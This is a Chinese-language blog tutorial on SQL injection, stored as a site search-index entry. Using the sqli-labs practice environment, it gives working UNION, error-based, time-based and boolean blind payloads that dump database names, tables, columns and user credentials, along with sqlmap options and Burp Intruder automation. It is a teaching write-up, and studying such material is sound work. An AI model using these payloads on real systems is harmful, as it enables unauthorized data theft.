<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>WEB安全系列-[SQL注入]</title>
    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSQL%E6%B3%A8%E5%85%A5%5D/</url>
    <content><![CDATA[<h1><span id="sql注入介绍">SQL注入介绍</span></h1><h3><span id="前言">前言</span></h3><p>SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库。</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1.png" alt="1"></p>
<h3><span id="sql注入的分类">SQL注入的分类</span></h3><p><strong>从注入手法分类可以分为：</strong></p>
<blockquote>
<p><strong>联合查询注入</strong></p>
<p><strong>报错型注入</strong></p>
<p><strong>布尔型注入</strong></p>
<p><strong>延时注入</strong></p>
<p><strong>堆叠注入</strong></p>
<p><strong>Cookie注入</strong></p>
<p><strong>HTTP头注入</strong></p>
<p><strong>JSON注入</strong></p>
<p><strong>POST注入</strong></p>
<p><strong>二次注入</strong></p>
<p><strong>DNS注入</strong></p>
<p><strong>宽字节注入</strong></p>
<p><strong>……</strong></p>
</blockquote>
<p><strong>从数据类型上可以分为：</strong></p>
<blockquote>
<p><strong>字符型（即输入的输入使用符号进行过滤）</strong></p>
<p><strong>数值型（即输入的输入未使用符号进行过滤）</strong></p>
</blockquote>
<p><strong>从注入位置可以分类为：</strong></p>
<blockquote>
<p><strong>GET数据（提交数据方式为GET，大多存在地址栏）</strong></p>
<p><strong>POST数据（提交数据方式为POST，大多存在输入框中）</strong></p>
<p><strong>HTTP头部（提交数据方式为HTTP头部）</strong></p>
<p><strong>cookie数据（提交数据方式为cookie）</strong></p>
</blockquote>
<h3><span id="sql注入的危害">SQL注入的危害</span></h3><p>分为两类：危害数据库里的数据、直接危害到网站的权限(需要满足条件)</p>
<ol>
<li><p>数据库信息泄露</p>
</li>
<li><p>网页篡改：登陆后台后发布恶意内容</p>
</li>
<li><p>网站挂马 : 当拿到webshell时或者获取到服务器的权限以后，可将一些网页木马挂在服务器上，去攻击别人</p>
</li>
<li><p>私自添加系统账号</p>
</li>
<li><p>读写文件获取webshell</p>
</li>
</ol>
<h3><span id="sql注入原理">SQL注入原理</span></h3><p>  SQL注入漏洞的产生需要满足以下两个条件：</p>
<ul>
<li>参数用户可控：前端传给后端的参数内容是用户可以控制的。</li>
<li>参数参与数据库操作：传入的参数直接拼接到SQL语句后，带入数据库进行相关操作。</li>
</ul>
<h3><span id="sql注入步骤">SQL注入步骤</span></h3><p><strong>1.注入点判断</strong>。</p>
<p>​        不同类别的网站注入点存在的位置也可能不一样，但其都有脱离不了一点就是与数据库进行交互，所以与数据库发生交互操作的功能点都有可能存在SQL注入，常出现注入点的位置有：新闻公告等查询处、用户注册处、用户登录处等等。</p>
<p><strong>2.判断SQL语句中的列数</strong>。</p>
<pre><code>   注入点正常实现的数据往往不是我们想要得到的数据，通常我们需要使用`union`或报错等操作，使得此注入点显示的数据是我们想要得到的，但构造我们需要的查询时必须要知道原SQL语句中的列数，否则SQL执行时会发生错误。
</code></pre>
<p><strong>3.判断SQL语句操作的回显位置</strong>。</p>
<p>​        使用<code>union</code>查询时我们需要找一个在前端显示的点，让我们查询到的数据显示出来，同样使用报错注入时也需要在前端显示我们想要得到的数据，所以需要先找到这样的一个点。</p>
<p><strong>4.构造SQL注入获取数据库指纹等</strong>。</p>
<p>​        在爆数据库内部信息时，需要先得到数据库用户名、版本、数据库名称等消息，这会对我们的后续注入有很大的帮助。例如：MySQL数据库5.0版本之后和之前的注入操作会有些许差别，另外数据库信息对我们查找对应的<code>1day</code>有很大的帮助。</p>
<p><strong>5.构造SQL语句爆数据表名</strong>。</p>
<p>​        对数据库进行爆破的最终目的是爆数据库字段值，但在爆字段值之前我们需要知道相对应的字段名和表名，因此开始正式爆破时，需要先得到数据库的表名信息。</p>
<p><strong>6.构造SQL语句爆字段名</strong>。</p>
<p>​        在拿到数据库表名信息后，需要继续爆破表中的字段值，以判断哪些字段是我们想要得到的。</p>
<p><strong>7.构造SQL语句爆字段值</strong>。</p>
<p>​        爆破的最终目的就是爆表中的字段值，再得到表名、字段名后就需要尝试爆我们想要得到的数据</p>
<h3><span id="判断注入点">判断注入点</span></h3><p><strong>判断注入点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and 1=1 页面正常<br>and 1=2 页面错误<br><br>SELECT * FROM user WHERE id=1 and 1=1 LIMIT 0,1 正常<br>SELECT * FROM user WHERE id=1 and 1=2 LIMIT 0,1 错误<br><br>(有一个正常，整个语句都为真)<br>SELECT * FROM user WHERE id=1 or 1=1 LIMIT 0,1 正常<br>SELECT * FROM user WHERE id=1 or 1=2 LIMIT 0,1 正常<br></code></pre></td></tr></table></figure>

<p><strong>判断字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">order by 1,2,3,4<br></code></pre></td></tr></table></figure>



<p><strong>常用的SQL数据库函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1. version()——MySQL 版本<br>2. user()——数据库用户名<br>3. database()——数据库名<br>4. @@datadir——数据库路径<br>5. @@version_compile_os——操作系统版本<br></code></pre></td></tr></table></figure>



<h1><span id="判断sql数据库类型">判断SQL数据库类型</span></h1><p><strong>前端与数据库类型</strong><br>asp：SQL Server，Access<br>.net：SQL Server<br>php：MySQL，PostgreSQL<br>java：Oracle，MySQL</p>
<p><strong>根据端口判断</strong><br>Oracle：默认端口1521<br>SQL Server：默认端口1433<br>MySQL：默认端口3306</p>
<p><strong>根据数据库特有函数来判断</strong><br>len和length<br>len()：SQL Server 、MySQL以及db2返回长度的函数。<br>length()：Oracle和INFORMIX返回长度的函数。</p>
<p><strong>version和@@version</strong><br>version()：MySQL查询版本信息的函数<br>@@version：MySQL和SQL Server查询版本信息的函数</p>
<p><strong>substring和substr</strong><br>MySQL两个函数都可以使用<br>Oracle只可调用substr<br>SQL Server只可调用substring</p>
<p><strong>根据特殊符号进行判断</strong><br><strong>&#x2F;</strong>*  是MySQL数据库的注释符<br><strong>–</strong>  是Oracle和SQL Server支持的注释符<br><strong>; ** 是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库<br><strong>#</strong>  是MySQL中的注释符，返回错误则说明可能不是MySQL，另外也支持– 和&#x2F;</strong>&#x2F;</p>
<h1><span id="sql注入利用">SQL注入利用</span></h1><p> <img src="/../../images/SQL%E6%B3%A8%E5%85%A5/MYSQL%E6%B3%A8%E5%85%A5.png" alt="img"> </p>
<h3><span id="union注入">UNION注入</span></h3><p> <code>union</code>操作符用于合并两个或多个SQL语句，得到<strong>联合查询结果</strong> </p>
<ol>
<li><p><strong>利用order判断字段数</strong></p>
<p>order by x(数字） 正常与错误的正常值  正确网页正常显示，错误网页报错</p>
<p>?id&#x3D;1’ order by 3–+</p>
</li>
<li><p><strong>利用 union select 联合查询，将id值设置成不成立，即可探测到可利用的字段数</strong></p>
<p>?id&#x3D;-1 union select 1,2,3 –+</p>
</li>
<li><p><strong>利用函数database(),user(),version()可以得到所探测数据库的数据库名、用户名和版本号</strong></p>
<p>?id&#x3D;-1 union select 1,database(),version() –+</p>
</li>
<li><p><strong>利用 union select 联合查询，获取表名</strong>  </p>
<p>?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’已知库名’–+</p>
</li>
<li><p><strong>利用 union select 联合查询，获取列名</strong></p>
<p>?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’已知表名’–+</p>
</li>
<li><p><strong>利用 union select 联合查询，获取字段值</strong></p>
<p>?id&#x3D;-1’ union select 1,2,group_concat(已知字段名,’:’已知字段名) from 已知表名–+</p>
</li>
</ol>
<h3><span id="高权限注入">高权限注入</span></h3><p>​        MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行getshell操作。其中也会遇到很多阻碍，相关防御方案也要明确，所谓知己知彼,百战不殆。不论作为攻击还是防御都需要了解其中的手法和原理，这样才是一个合格的安全工作者。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1272951/1621404478267-41dfa830-312e-42bf-a4b3-366e08be8d2c.png?x-oss-process=image/resize,w_1102/resize,w_928,limit_0" alt="img"> </p>
<p><strong>MySQL 5.x数据结构</strong></p>
<ol>
<li><p>在MySQL 5.0以上版本中，为了方便管理，默认定义了information_schema数据 库，用来存储数据库元信息，其中具有表schemata（数据库名），table（表名），columns（列名或字段名）</p>
</li>
<li><p>在schemata表中，schema_name字段用来存储数据库名</p>
</li>
<li><p>在table表中，table_schema和table_name分别用来存储数据库名和表名</p>
</li>
<li><p>在column表中，table_schema（数据库名），table_name（表名），column_name（字段名）</p>
</li>
<li><p>获取所有数据库名</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">union select 1,group_concat(schema_name),3 from information_schema.schemata<br><br></code></pre></td></tr></table></figure>

<ol start="2">
<li>获取指定数据库下的表名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;pikachu&#x27;<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>获取指定数据库指定表名下的列名信息</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">union select 1,group_concat(column_name),3 from information_schema.columns where  table_name=&#x27;users&#x27; and table_schema=&#x27;pikachu&#x27;<br></code></pre></td></tr></table></figure>

<ol start="4">
<li>获取指定列下的字段信息</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">union select 1,username,password from users  LIMIT 1,1 --+<br></code></pre></td></tr></table></figure>





<h1><span id="web漏洞类型及提交注入">WEB漏洞—类型及提交注入</span></h1><pre><code>     在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方 法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取， 后续安全测试中我们也必须满足同等的操作才能进行注入
</code></pre>
<h3><span id="简要明确参数类型"><strong>简要明确参数类型</strong></span></h3><p><strong>根据网站上的参数或者值来判定注入的时候是否需要考虑符号的问题</strong></p>
<p><strong>数字，字符，搜索，JSON 等</strong></p>
<h3><span id="数字x2f字符"><strong>数字&#x2F;字符</strong></span></h3><p>数字型：基本不用引号，但是也不是绝对的，数字也可以加单引号</p>
<p>字符型：一般采用单引号，但是不单止单引号 也可以是 ‘,”,%,),}等</p>
<p><strong>即使有注入也会带入单引号里，产生不了任何作用，所以我们要做的前提是先要把它的符号闭合掉</strong></p>
<p>select * from user where id &#x3D;1;</p>
<p>select * from user where name&#x3D;’xiaojun’;</p>
<p><img src="D:/my_blog/source/images/sql%25E6%25B3%25A8%25E5%2585%25A5/8.png" alt="8"></p>
<p>$name&#x3D;$_GET[‘x’];</p>
<p>$sql&#x3D;<strong>“<strong>select * from user where name&#x3D;’$name’</strong>“;</strong></p>
<p>这样的话，注入语句就被写到单引号中了，那么这条语句就没有作用了</p>
<p>?x&#x3D;xiaojun and 1&#x3D;1</p>
<p>select * from user where name&#x3D;’xiaojun and 1&#x3D;1’</p>
<p><strong>and  1&#x3D;1原始的意义是应该拼接到SQL语句中形成一个逻辑判断的情况，由于单引号的出现导致语句写到单引号里面成为一个单纯的字符串，没有了任何意义.</strong></p>
<p><strong>根据网站自身的参数的值来判断在注人的时候是否需要考虑符合的问题。</strong></p>
<p><img src="D:/my_blog/source/images/sql%25E6%25B3%25A8%25E5%2585%25A5/9.png" alt="9"></p>
<h3><span id="搜索"><strong>搜索</strong></span></h3><p>​        <strong>将数据进行搜索并进行展示，搜索符号是%，在过滤的时候要过滤单引号和百分号，不然语句全部在单引号和百分号里</strong></p>
<p>select * from user where name like ‘%xiaojun%’ </p>
<h3><span id="简要明确请求方法"><strong>简要明确请求方法</strong></span></h3><ul>
<li><p><strong>GET,POST,COOKIE,REQUEST,HTTP</strong> 头等</p>
</li>
<li><p><strong>请求方法可以通过浏览器开发者模式查看数据包的前缀</strong></p>
</li>
</ul>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/10.png" alt="10"></p>
<ul>
<li><strong>一般情况下，大数据采用POST上传方式</strong></li>
</ul>
<p><strong>不同的请求方法，请求数据，类型，大小，都不一样</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">GET产生一个TCP数据包；POST产生两个TCP数据包。<br>         对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；<br>          而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。<br>      	 GET方法无法接收POST的值<br>   在POST情况下GET的值只要在网址后面就能接收<br>   GET、POST接收单个<br>   REQUEST 全部接收，网站在访问的时候由于我们大多数是黑盒测试，不知道对方代码写法，如果对方采用REQUEST接收方式，就不需要考虑用何种方法去提交，因为用GET、POST都可以。如果对方是单一接收方式，那么在注入的时候需要用它的方法去注入。<br></code></pre></td></tr></table></figure>

<h3><span id="get和post两种基本请求方法和区别">GET和POST两种基本请求方法和区别：</span></h3><p><a href="https://www.cnblogs.com/logsharing/p/8448446.html">https://www.cnblogs.com/logsharing/p/8448446.html</a></p>
<h3><span id="干扰符号">干扰符号</span></h3><p> SQL 语句干扰符号：’,”,%,),}等，具体需看写法</p>
<p>Less-1为例：</p>
<ol>
<li><p><a href="http://127.0.0.1/Less-1/?id=1&#39;">http://127.0.0.1/Less-1/?id=1&#39;</a>  and 1&#x3D;1</p>
<p>报错语句： SELECT * FROM users WHERE id&#x3D;’1’  and 1&#x3D;1’ LIMIT 0,1 </p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/11.png" alt="11"></p>
</li>
<li><p>正确的SQL语句：<a href="http://127.0.0.1/Less-1/?id=1&#39;">http://127.0.0.1/Less-1/?id=1&#39;</a>  and ‘1’&#x3D;’1</p>
</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/12.png" alt="12"></p>
<ol start="3">
<li>当然，这种方法显得麻烦，直接使用注释也可以起到同样的效果</li>
</ol>
<p>–+负责把后面的单引号注释掉</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/13.png" alt="13"></p>
<h3><span id="post注入"><strong>POST注入</strong>：</span></h3><h3><span id="cookie注入">COOKIE注入：</span></h3><h3><span id="http头注入">HTTP头注入：</span></h3><h3><span id="json注入相关知识">JSON注入相关知识</span></h3><p>a. 简介</p>
<p>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application&#x2F;json”</p>
<p> JSON语法</p>
<p>■数据在名称&#x2F;值对中</p>
<p>■数据由逗号分隔</p>
<p>■大括号保存对象</p>
<p>■中括号保存数组</p>
<p>JSON值</p>
<p>■数字（整数或浮点数） {“age”:30 }</p>
<p>■字符串（在双引号中） {“uname”:”yang”}</p>
<p>■逻辑值（true 或 false） {“flag”:true }</p>
<p>■数组（在中括号中）{“sites”:[{“name”:”yang”},{“name”:”ming”}]}</p>
<p>■对象（在大括号中）JSON 对象在大括号（{}）中书写：</p>
<p>■null  { “runoob”:null }</p>
<p>d. JSON代码格式</p>
<h3><span id="sqlmap简单使用">SQLMap简单使用</span></h3><p>● –is-dba 当前用户权限（是否为root权限）<br>● –dbs 所有数据库<br>● –current-db 网站当前数据库<br>● –users 所有数据库用户<br>● –current-user 当前数据库用户<br>● –random-agent 构造随机user-agent<br>● –passwords 数据库密码<br>● –proxy <a href="http://local:8080/">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理<br>● –time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
<p><strong>常用方法：</strong></p>
<p><img src="D:/my_blog/source/images/sql%25E6%25B3%25A8%25E5%2585%25A5/14.png" alt="14"></p>
<p><strong>详细SQLMap使用：</strong></p>
<h1><span id="web漏洞查询方式及盲注">WEB漏洞—查询方式及盲注</span></h1><p><strong>前言</strong></p>
<p>​            当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句</p>
<p><strong>涉及知识点：</strong></p>
<ul>
<li><p><strong>报错盲注</strong></p>
</li>
<li><p><strong>延迟盲注</strong></p>
</li>
<li><p><strong>布尔盲注</strong></p>
</li>
</ul>
<h3><span id="ascci码表">ASCCI码表</span></h3><p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/ascci.png" alt="1646537964629"></p>
<p><strong>SQL语句</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs sqlite">select 查询数据<br>在网站应用中进行数据显示查询效果<br>例： select * from news wher id=$id<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mssql">insert 插入数据<br><br>在网站应用中进行用户注册添加等操作<br>例：insert into news(id,url,text) values(2,&#x27;x&#x27;,&#x27;$t&#x27;)<br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">delete</span> 删除数据<br><br>后台管理里面删除文章删除用户等操作<br>例：<span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>$id<br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> 更新数据<br><br>会员或后台中心数据同步或缓存等操作<br>例：<span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> pwd<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$p&#x27;</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">and</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 排列数据<br><br>一般结合表名或列名进行数据排序操作<br>例：<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> $id<br>例：<span class="hljs-keyword">select</span> id,name,price <span class="hljs-keyword">from</span> news <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> $<span class="hljs-keyword">order</span><br></code></pre></td></tr></table></figure>



<h3><span id="报错盲注">报错盲注</span></h3><p>发现注入漏洞时，构造sql语句不回显类容，但是会打印报错语句</p>
<p>目的：让错误信息返回数据库中的类容</p>
<p>原理分析：</p>
<ul>
<li><p><strong>floor()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">首先我们探讨一下是什么导致了报错，真是floor（）这个函数吗？<br>floor这个函数，它的作用是返回参数的最小整数。也就是向下取整（2.2 ==》）。很显然这个函数不可能导致报错。再者count（*）就是一个计数的函数，也不是。其实真正发生作用的是第二层括号里面的代码<br><br>select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x<br><br>Mysql在执行 select count() from XXX group by x这一类语句时会先创建一个虚拟表，然后在虚拟表中插入数据，key是主键，不可重复。记住，不可重复，这个是重点。key就是后面那个x<br>假设我们现在有这样一个表<br></code></pre></td></tr></table></figure>

<p>使用 group by 对一些rand()函数进行操作时会返回重复键</p>
<p>（duplicate key）错误</p>
<p>向下取整：省略小数点后的数，不会四舍五入</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/14.png" alt="1646477221722"></p>
<p>rand:产生尾随机数的序列，随机产生一个0-1之间的数</p>
<p><img src="D:/my_blog/source/images/%25E6%258A%25A5%25E9%2594%2599/2" alt="1646469346588"></p>
</li>
</ul>
<p>不加参数每次执行都是不一样的结果，加参数每次执行都是一样的结果</p>
<ul>
<li><p>count (*)</p>
<p>对数据计数</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/3233.png" alt="1646475156026"></p>
</li>
<li><p>group by </p>
<p>分组</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/4.png" alt="1646475534047"></p>
</li>
</ul>
<p><strong>count(<em>)和group by 特性：count(</em>)和group by在执行的时候会创建虚拟表，虚拟表用来处理数据，计数</strong></p>
<ol>
<li>获取数据库名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and(select 1 from(select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/5.png" alt="1646480666891"></p>
<ol start="2">
<li>爆表名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/6..png" alt="1646480854172"></p>
<ol start="3">
<li>爆字段</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from (select count(*),concat((select (column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;users&#x27; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/7.png" alt="1646481042045"></p>
<ol start="4">
<li>爆字段数据</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/8.png" alt="1646481199468"></p>
<ul>
<li><strong>updatexml()和extractvalue()报错注入</strong></li>
<li>截取的数据最多显示32位，超过32位使用分段显示</li>
</ul>
<p><strong>xpath语法错误，通过爆语法错误，顺便第二个参数里面的参数类容也爆出来，只要让第二个参数不符合xpath语法就可以报错</strong></p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1646536236587.png" alt="1646536236587"></p>
<p> <strong>updatexml：</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and updatexml(1,concat(&quot;~&quot;,(database())),0)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/9.png" alt="1646534166611"></p>
<p>获取表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x7e),1))--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1646536736551.png" alt="1646536736551"></p>
<p>列，字段，数据….省略</p>
<p><strong>extractvalue：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and extractvalue(null,concat(0x7e,(select user()),0x7e));--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1660.png" alt="1646534259127"></p>
<h3><span id="延迟盲注"><strong>延迟盲注</strong></span></h3><p>判断目标是否真的存在注入点，我们可以加单引号，双引号，减号 等干扰字符来确定输入的参数是否能代入数据库中，但是如果不管输入什么不管怎么闭合，前端页面都是显示正常，那么这时候时间盲注应运而生</p>
<p>来到sqlilabs的第九关，当我们在url上输入任何参数返回页面都返回正常</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/62611.png" alt="1646459336591"></p>
<p>时间盲注的利用过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and if(1=1,sleep(5),1)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/212.png" alt="1646459863671"></p>
<ol start="2">
<li><p>每一个字符都对应一个字符，我们需要ASCII码进行比较通过它的真假来判断截取的字符对应的是什么</p>
<p>通过ASCII函数来判断</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and if ((ascii(mid((select version()),1,1))=53),sleep(5),1)--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/214.png" alt="1646467884085"></p>
<h3><span id="布尔盲注"><strong>布尔盲注</strong></span></h3><p>目标网站即使存在注入，即使存在注入，也没有任何的回显，不管怎样改变参数，有么就是页面没有变化，要么就是页面啥也没有，对于这种情况，我们可以通过布尔盲注要么返回要么不返回的两种状态的改变来判断我们想要的结果</p>
<p>例如：语句是被带入到数据库执行，但是在页面上看不到任何的信息</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/115.png" alt="1646236190924"></p>
<p><strong>开始注入演示</strong>：</p>
<p>函数：</p>
<ul>
<li>判断长度函数：length</li>
<li>判断数据库名&gt;&#x3D;&lt;某值</li>
<li>将字符传换成Ascii</li>
</ul>
<ol>
<li>通过length函数来判断数据库名长度</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/9916.png" alt="1646237125455"></p>
<ol start="2">
<li>获取数据库名字</li>
</ol>
<p>substr(database(),1,a)从数据库名字的第一个开始取第a个</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1217..png" alt="1646237780843"></p>
<p>3.使用ASCLL将字符转换成数字比较</p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/2119.png" alt="1646238250232"></p>
<ol start="3">
<li>获取表</li>
</ol>
<ul>
<li><p>判断表的数量：count,information_schema</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select count(*) from information_schema.tables where table_schema=database())=4--+<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/3618.png" alt="1646283281839"></p>
</li>
<li><p>获取表名字的长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=5--+<br></code></pre></td></tr></table></figure>

<p><strong>注意：这里的limit 0,1排序是从0开始的</strong></p>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/12320.png" alt="1646284501803"></p>
</li>
<li><p>获取表名字</p>
<p>and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema&#x3D;database() limit 0,1)&#x3D;101–+</p>
<p><strong>注：获取完一个表名，可以设置limit切换下个表</strong></p>
</li>
</ul>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/2521.png" alt="1646285143209"></p>
<h3><span id="burp获取表名信息">Burp获取表名信息</span></h3><p>在实际的 WEB渗透中如果目标存在布尔注入，我们在url地址上一个个的测试是非常的麻烦，效率很低的。，所以使用<strong>Burp</strong>的<strong>Intruder</strong>来猜解信息是一个不错的选择</p>
<p>使用Burp获取表名：</p>
<ol>
<li>先抓一个包，然后发送给给Intruder模块</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/22.png" alt="1646384318158"></p>
<ol start="2">
<li>Intruder配置</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/23.png" alt="1646384375603"></p>
<ol start="3">
<li>设置变量符号</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/24.png" alt="1646384978480"></p>
<ol start="4">
<li>设定类型以及范围</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/25.png" alt="1646385182573"></p>
<ol start="5">
<li>设定好后就可以开始攻击了</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/26.png" alt="1646385233286"></p>
<ol start="6">
<li><p>开始扫描后，Burp会从0-127依次尝试，当页面回显正常，就会被burp识别，一个个的尝试，最终获取完整表名</p>
<p><strong>注：如果找不到，点击length排序一下</strong></p>
</li>
</ol>
<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/27.png" alt="1646389674912"></p>
<ul>
<li>获取列名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select count(column_name)  from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=3--+<br><br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/28.png" alt="1646391486413"></p>
<ul>
<li>获取列名长度</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-8</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select  length(column_name)  from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1)=2--+</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>

<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/30.png" alt="1646391728435"></p>
<ul>
<li>获取列名名称</li>
</ul>
